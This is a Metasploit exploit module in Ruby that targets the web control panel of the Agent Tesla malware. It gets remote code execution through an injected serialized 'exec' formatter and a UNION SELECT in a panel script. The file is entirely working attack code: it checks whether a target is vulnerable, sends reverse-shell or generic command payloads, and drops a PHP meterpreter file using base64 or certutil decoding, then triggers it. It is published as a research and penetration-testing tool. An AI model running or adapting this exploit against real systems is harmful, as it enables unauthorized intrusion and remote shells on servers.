##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Agent Tesla Panel Remote Code Execution',
      'Description' => %q{
        This module exploit the command injection vulnerability in control center of the agent Tesla.
      },
      'Author' => [
        'Ege Balcı <ege.balci@invictuseurope.com>', # discovery and independent module
        'mekhalleh (RAMELLA Sébastien)' # add. targetting windows
      ],
      'References' => [
        ['URL', 'https://github.com/mekhalleh/agent_tesla_panel_rce/tree/master/resources'], # Agent-Tesla WebPanel available for download
        ['URL', 'https://www.cyber.nj.gov/threat-profiles/trojan-variants/agent-tesla'],
        ['URL', 'https://krebsonsecurity.com/2018/10/who-is-agent-tesla/']
      ],
      'DisclosureDate' => '2018-07-10',
      'License' => MSF_LICENSE,
      'Platform' => ['unix', 'windows'],
      'Arch' => [ARCH_CMD, ARCH_PHP],
      'Privileged' => true,
      'Targets' => [
        ['Automatic (Dropper)',
          'Platform' => 'php',
          'Arch' => [ARCH_PHP],
          'Type' => :php_dropper,
          'DefaultOptions' => {
            'PAYLOAD' => 'php/meterpreter/reverse_tcp'
          }
        ],
        ['Unix (In-Memory)',
          'Platform' => 'unix',
          'Arch' => ARCH_CMD,
          'Type' => :unix_memory,
          'DefaultOptions' => {
            'PAYLOAD' => 'cmd/unix/generic'
          }
        ],
        ['Windows (In-Memory)',
          'Platform' => 'windows',
          'Arch' => ARCH_CMD,
          'Type' => :windows_memory,
          'DefaultOptions' => {
            'PAYLOAD' => 'cmd/windows/reverse_powershell'
          }
        ],
      ],
      'DefaultTarget' => 0,
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'Reliability' => [REPEATABLE_SESSION],
        'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
      }
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'The URI of the tesla agent with panel path', '/WebPanel/'])
    ])
  end

  def get_os
    received = parse_response(execute_command('echo $PATH'))
    ## Not linux, check Windows.
    if(received.include?('$PATH'))
      received = parse_response(execute_command('echo %PATH%'))
    end

    os = false
    if(received =~ /^\//)
      os = 'linux'
    elsif(received =~ /^[a-zA-Z]:\\/)
      os = 'windows'
    end

    return(os)
  end

  def parse_response(js)
    return false unless js
    json = JSON.parse(sanitize_json(js.body))
    return "#{json['data'][0]['username']}"
  rescue
    return false
  end

  def sanitize_json(js)
    js.gsub!("},\r\n]", "}]")
    js.gsub!("'", '"')
    return js.gsub('", }', '"}')
  end

  def execute_command(command)
    junk = rand(1_000)
    response = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'server_side', 'scripts', 'server_processing.php'),
      'encode_params' => true,
      'vars_get' => {
        'table' => 'passwords',
        'primary' => 'password_id',
        'clmns' => 'a:1:{i:0;a:3:{s:2:"db";s:3:"pwd";s:2:"dt";s:8:"username";s:9:"formatter";s:4:"exec";}}',
        'where' => Rex::Text.encode_base64("#{junk}=#{junk} UNION SELECT \"#{command}\"")
      }
    )
    if (response) && (response.body)
      return response
    end

    return false
  end

  def check
    rand_str = Rex::Text.rand_text_alpha(8)
    received = parse_response(execute_command("echo #{rand_str}"))
    if (received) && (received.include?(rand_str))
      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    unless check.eql? Exploit::CheckCode::Vulnerable
      fail_with(Failure::NotVulnerable, 'The target is not exploitable.')
    end
    vprint_good("The target appears to be vulnerable.")

    case target['Type']
    when :unix_memory, :windows_memory
      print_status("Sending #{datastore['PAYLOAD']} command payload")
      vprint_status("Generated command payload: #{payload.encoded}")

      received = execute_command(payload.encoded)
      if (received) && (datastore['PAYLOAD'] == "cmd/#{target['Platform']}/generic")
        print_warning('Dumping command output in parsed json response')
        output = parse_response(received)
        if output.empty?
          print_error('Empty response, no command output')
          return
        end
        print_line("#{output}")
      end
    when :php_dropper
      unless os = get_os
        print_bad('Could not determine the targeted operating system.')
        return Msf::Exploit::Failed
      end
      print_status("Targeted operating system is: #{os}")

      file_name = '.' + Rex::Text.rand_text_alpha(4) + '.php'
      case(os)
      when /linux/
        cmd = "echo #{Rex::Text.encode_base64(payload.encoded)} | base64 -d > #{file_name}"
      when /windows/
        cmd = "echo #{Rex::Text.encode_base64(payload.encoded)} > #{file_name}.b64 & certutil -decode #{file_name}.b64 #{file_name} & del #{file_name}.b64"
      end
      print_status("Sending #{datastore['PAYLOAD']} command payload")
      vprint_status("Generated command payload: #{cmd}")

      received = execute_command(cmd)
      unless (received) && (received.code == 200) && (received.body.include?('recordsTotal'))
        print_error('Payload upload failed :(')
        return(Msf::Exploit::Failed)
      end
      print_status("Payload uploaded as: #{file_name}")

      ## Triggering.
      send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'server_side', 'scripts', file_name)
      }, 2.5)
    end
  end

end
